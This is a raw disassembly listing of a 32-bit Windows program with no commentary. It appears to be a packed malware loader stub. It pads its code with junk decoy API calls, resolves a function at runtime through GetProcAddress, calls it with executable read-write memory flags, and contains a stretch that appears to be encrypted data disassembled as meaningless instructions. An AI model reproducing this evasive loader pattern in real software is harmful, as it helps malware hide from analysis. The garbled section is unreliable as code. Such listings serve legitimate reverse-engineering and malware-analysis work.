0x00401000:	pushl	%ebp	; from: 0x00402855(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -8(%ebp)
0x0040100e:	movl	$0x0, -112(%ebp)
0x00401015:	movl	$0x0, -4(%ebp)
0x0040101c:	movl	$0x0, -72(%ebp)
0x00401023:	movl	$0x0, -60(%ebp)
0x0040102a:	movl	$0x0, -24(%ebp)
0x00401031:	movl	$0x0, -16(%ebp)
0x00401038:	movl	$0x0, -12(%ebp)
0x0040103f:	movl	$0x0, -108(%ebp)
0x00401046:	movl	$0x0, -20(%ebp)
0x0040104d:	movl	$0x0, -32(%ebp)
0x00401054:	movl	$0x0, -76(%ebp)
0x0040105b:	movl	$0x0, -104(%ebp)
0x00401062:	movl	$0x0, -68(%ebp)
0x00401069:	movl	$0x0, -56(%ebp)
0x00401070:	movl	$0x0, -80(%ebp)
0x00401077:	movl	$0x0, -64(%ebp)
0x0040107e:	movl	$0x0, -28(%ebp)
0x00401085:	movl	0x0045b214, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x0045b218, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x0045b21c, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x0045b220, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x0045b224, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x0045b228, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x0045b22c, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x0045b230, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x0045b232, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -28(%ebp)
0x004010dc:	movl	-80(%ebp), %eax
0x004010df:	pushl	%eax
0x004010e0:	call	ReleaseMutex@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004010e6:	leal	-28(%ebp), %ecx
0x004010e9:	pushl	%ecx
0x004010ea:	leal	-12(%ebp), %edx
0x004010ed:	pushl	%edx
0x004010ee:	pushl	$0x4
0x004010f0:	call	CopySid@advapi32.dll	; targets: 0xff000160(MAY)
0x004010f6:	testl	%eax, %eax
0x004010f8:	je	0x00401123	; targets: 0x004010fa(MAY), 0x00401123(MAY)
0x004010fa:	pushl	$0x7b	; from: 0x004010f8(MAY)
0x004010fc:	pushl	$0x0
0x004010fe:	pushl	$0xa
0x00401100:	pushl	$0x0
0x00401102:	call	LoadStringA@user32.dll	; targets: 0xff000110(MAY)
0x00401108:	movl	-12(%ebp), %eax
0x0040110b:	addl	$0x1, %eax
0x0040110e:	movl	%eax, -12(%ebp)
0x00401111:	pushl	$0x3
0x00401113:	pushl	$0x0
0x00401115:	pushl	$0x2
0x00401117:	movl	-12(%ebp), %ecx
0x0040111a:	pushl	%ecx
0x0040111b:	pushl	$0x0
0x0040111d:	call	AddAce@advapi32.dll	; targets: 0xff000070(MAY)
0x00401123:	call	GetLastError@kernel32.dll	; targets: 0xff0001c0(MAY)	; from: 0x004010f8(MAY)
0x00401129:	movl	%eax, -32(%ebp)
0x0040112c:	movzwl	-32(%ebp), %edx
0x00401130:	cmpl	$0x7a, %edx
0x00401133:	jne	0x00401166	; targets: 0x00401166(MAY), 0x00401135(MAY)
0x00401135:	movl	$0xe0d, -24(%ebp)	; from: 0x00401133(MAY)
0x0040113c:	movl	$0x3a, -68(%ebp)
0x00401143:	movb	$0x0, -36(%ebp)
0x00401147:	movl	$0x131a3ae3, -8(%ebp)
0x0040114e:	pushl	$0x8000
0x00401153:	pushl	$0x0
0x00401155:	pushl	$0x0
0x00401157:	call	VirtualFree@kernel32.dll	; targets: 0xff000150(MAY)
0x0040115d:	movl	$0xddeb7, -108(%ebp)
0x00401164:	jmp	0x00401199	; targets: 0x00401199(MAY)
0x00401166:	movb	$0x0, 0x00403090	; from: 0x00401133(MAY)
0x0040116d:	pushl	$0x406fa0
0x00401172:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000180(MAY)
0x00401178:	movl	%eax, -32(%ebp)
0x0040117b:	movl	-80(%ebp), %eax
0x0040117e:	pushl	%eax
0x0040117f:	pushl	$0x8
0x00401181:	movl	-112(%ebp), %ecx
0x00401184:	pushl	%ecx
0x00401185:	call	HeapAlloc@kernel32.dll	; targets: 0xff000060(MAY)
0x0040118b:	pushl	$0x403090
0x00401190:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000180(MAY)
0x00401196:	movl	%eax, -32(%ebp)
0x00401199:	movl	-112(%ebp), %edx	; from: 0x00401164(MAY)
0x0040119c:	pushl	%edx
0x0040119d:	call	UpdateWindow@user32.dll	; targets: 0xff0001b0(MAY)
0x004011a3:	pushl	$0x3
0x004011a5:	pushl	$0x0
0x004011a7:	pushl	$0x18
0x004011a9:	movl	-112(%ebp), %eax
0x004011ac:	pushl	%eax
0x004011ad:	call	SendMessageA@user32.dll	; targets: 0xff000140(MAY)
0x004011b3:	pushl	$0x45b234
0x004011b8:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000180(MAY)
0x004011be:	movl	%eax, -80(%ebp)
0x004011c1:	leal	-48(%ebp), %ecx
0x004011c4:	pushl	%ecx
0x004011c5:	movl	-80(%ebp), %edx
0x004011c8:	pushl	%edx
0x004011c9:	call	GetProcAddress@kernel32.dll	; targets: 0xff000010(MAY)
0x004011cf:	movl	%eax, -52(%ebp)
0x004011d2:	pushl	-28(%ebp)
0x004011d5:	pushl	$0x1000
0x004011da:	movl	-24(%ebp), %eax
0x004011dd:	addl	$0x46, %eax
0x004011e0:	pushl	%eax
0x004011e1:	pushl	$0x0
0x004011e3:	movl	-52(%ebp), %ebx
0x004011e6:	call	%ebx	; targets: unresolved

start:
0x004012bf:	pushl	%ebp
0x004012c0:	movl	%esp, %ebp
0x004012c2:	subl	$0x54, %esp
0x004012c5:	movl	$0x0, -52(%ebp)
0x004012cc:	movl	$0x0, -48(%ebp)
0x004012d3:	movl	$0x0, -4(%ebp)
0x004012da:	movl	$0x0, -80(%ebp)
0x004012e1:	movl	$0x0, -60(%ebp)
0x004012e8:	pushl	$0x3
0x004012ea:	pushl	$0x0
0x004012ec:	pushl	$0x0
0x004012ee:	movl	-80(%ebp), %eax
0x004012f1:	pushl	%eax
0x004012f2:	call	PostMessageA@user32.dll	; targets: 0xff000130(MAY)
0x004012f8:	leal	-76(%ebp), %ecx
0x004012fb:	pushl	%ecx
0x004012fc:	call	GetSystemTime@kernel32.dll	; targets: 0xff000120(MAY)
0x00401302:	call	GetLastError@kernel32.dll	; targets: 0xff0001c0(MAY)
0x00401308:	movl	%eax, -48(%ebp)
0x0040130b:	pushl	$0x8
0x0040130d:	leal	-44(%ebp), %edx
0x00401310:	pushl	%edx
0x00401311:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000100(MAY)
0x00401317:	call	GetDesktopWindow@user32.dll	; targets: 0xff000190(MAY)
0x0040131d:	movl	-52(%ebp), %eax
0x00401320:	pushl	%eax
0x00401321:	call	0x00401371	; targets: 0x00401371(MAY)
0x00401371:	pushl	%ebp	; from: 0x00401321(MAY)
0x00401372:	movl	%esp, %ebp
0x00401374:	subl	$0x3c, %esp
0x00401377:	pushl	%esi
0x00401378:	movl	$0x0, -60(%ebp)
0x0040137f:	movl	$0x0, -48(%ebp)
0x00401386:	movl	$0x0, -28(%ebp)
0x0040138d:	movl	$0x0, -56(%ebp)
0x00401394:	movl	$0x0, -36(%ebp)
0x0040139b:	movl	$0x0, -40(%ebp)
0x004013a2:	movl	$0xe6f8acde, -36(%ebp)
0x004013a9:	movl	$0x45b244, -44(%ebp)
0x004013b0:	pushl	$0xa
0x004013b2:	pushl	$0xa
0x004013b4:	pushl	$0x0
0x004013b6:	call	GetPixel@gdi32.dll	; targets: 0xff0000c0(MAY)
0x004013bc:	movl	$0x0, -52(%ebp)
0x004013c3:	movl	-36(%ebp), %eax
0x004013c6:	movl	%eax, -32(%ebp)
0x004013c9:	movl	GetLastError@kernel32.dll, %ecx
0x004013cf:	movl	%ecx, -4(%ebp)
0x004013d2:	movl	-48(%ebp), %edx
0x004013d5:	pushl	%edx
0x004013d6:	pushl	$0x0
0x004013d8:	pushl	$0x0
0x004013da:	movl	-56(%ebp), %eax
0x004013dd:	pushl	%eax
0x004013de:	call	0x00402972	; targets: 0x00402972(MAY)
0x004013e3:	pushl	$0x0
0x004013e5:	movl	-56(%ebp), %ecx
0x004013e8:	pushl	%ecx
0x004013e9:	call	GetClientRect@user32.dll	; targets: 0xff000170(MAY)
0x004013ef:	pushl	$0x8000
0x004013f4:	pushl	$0x0
0x004013f6:	movl	-56(%ebp), %edx
0x004013f9:	pushl	%edx
0x004013fa:	pushl	$0xffffffff
0x004013fc:	call	VirtualFreeEx@kernel32.dll	; targets: 0xff0001a0(MAY)
0x00401402:	testl	%eax, %eax
0x00401404:	je	0x00402849	; targets: 0x0040140a(MAY), 0x00402849(MAY)
0x0040140a:	pushl	$0x0	; from: 0x00401404(MAY)
0x0040140c:	call	TlsFree@kernel32.dll	; targets: 0xff0000f0(MAY)
0x00401412:	je	0x0040142e	; targets: 0x00401415(MAY)
0x00401415:	aaa		; from: 0x00401412(MAY)
0x00401416:	xorb	0x1e7bcfdf(%ebx), %dl
0x0040141c:	subl	%edi, -23999227(%esi)
0x00401422:	pushl	%eax
0x00401423:	rcrl	$0x3, -21(%ecx)
0x00401427:	xorb	$0xffffffb9, %al
0x00401429:	incl	%ebp
0x0040142a:	aas	
0x0040142b:	popl	%ebp
0x0040142c:	stosb	%al, %es:(%edi)
0x0040142d:	decl	%eax
0x0040142e:	popl	-1818907477(%eax)
0x00401434:	andb	%al, -91(%ebx)
0x00401437:	call	-897349845	; targets: 0xcac39b67(MAY)
0x00402849:	movl	-4(%ebp), %esi	; from: 0x00401404(MAY)
0x0040284c:	call	%esi	; targets: 0xff0001c0(MAY)
0x0040284e:	movl	%eax, -56(%ebp)
0x00402851:	movl	-32(%ebp), %eax
0x00402854:	pushl	%eax
0x00402855:	call	0x00401000	; targets: 0x00401000(MAY)
0x00402972:	jmp	GetModuleInformation@psapi.dll	; targets: 0xff000090(MAY)	; from: 0x004013de(MAY)
